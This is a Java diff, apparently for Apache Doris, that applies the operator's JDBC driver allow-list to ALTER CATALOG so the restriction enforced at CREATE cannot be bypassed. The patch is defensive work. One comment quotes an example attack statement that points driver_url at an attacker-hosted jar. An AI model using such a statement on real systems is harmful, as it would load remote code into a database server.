@@ -20,6 +20,7 @@ package org.apache.doris.datasource.plugin;
 import org.apache.doris.analysis.ColumnPath;
 import org.apache.doris.catalog.Column;
 import org.apache.doris.catalog.Env;
+import org.apache.doris.catalog.JdbcResource;
 import org.apache.doris.catalog.TableIf;
 import org.apache.doris.catalog.info.ColumnPosition;
 import org.apache.doris.catalog.info.CreateOrReplaceBranchInfo;
@@ -250,6 +251,7 @@ public class PluginDrivenExternalCatalog extends ExternalCatalog {
         } catch (IllegalArgumentException e) {
             throw new DdlException(e.getMessage(), e);
         }
+        checkDriverUrlsAgainstOperatorGate(candidate);
         ExternalFunctionRules.check(candidateProperty.getOrDefault("function_rules", null));
         return true;
     }
@@ -261,6 +263,33 @@ public class PluginDrivenExternalCatalog extends ExternalCatalog {
                     FileFormatConstants.PROP_HIVE_PARQUET_TIME_ZONE, null);
             if (hiveParquetTimeZone != null) {
                 FileFormatUtils.parseHiveParquetTimeZone(hiveParquetTimeZone);
+            }
+        }
+    }
+
+    /**
+     * Applies the operator's driver-jar gate ({@code jdbc_driver_secure_path} /
+     * {@code jdbc_driver_url_white_list}) to every driver_url the connector says these properties would
+     * make it load into the FE JVM.
+     *
+     * <p>On CREATE the same gate is applied by the connector's {@code preCreateValidation} (through
+     * {@link org.apache.doris.connector.DefaultConnectorValidationContext#validateAndResolveDriverPath}),
+     * which ALTER CATALOG never reaches — it validates through {@code validatePropertiesBeforeUpdate}
+     * alone. Without this call an operator who restricts {@code jdbc_driver_secure_path} would have that
+     * restriction enforced at CREATE and then bypassed by a follow-up
+     * {@code ALTER CATALOG ... SET PROPERTIES("driver_url" = "http://attacker/evil.jar")}, which
+     * {@code resetToUninitialized} makes effective on the next metadata access.
+     *
+     * <p>Deliberately NOT applied on replay: this runs from the {@code !isReplay} ALTER path only, so an
+     * existing catalog whose driver_url predates a since-tightened allow-list keeps loading and FE
+     * startup / follower replay can never be blocked by it.
+     */
+    private void checkDriverUrlsAgainstOperatorGate(Map<String, String> candidate) throws DdlException {
+        for (String driverUrl : ConnectorFactory.driverUrlsToValidate(getType(), candidate)) {
+            try {
+                JdbcResource.getFullDriverUrl(driverUrl);
+            } catch (IllegalArgumentException e) {
+                throw new DdlException(e.getMessage(), e);
             }
         }
     }
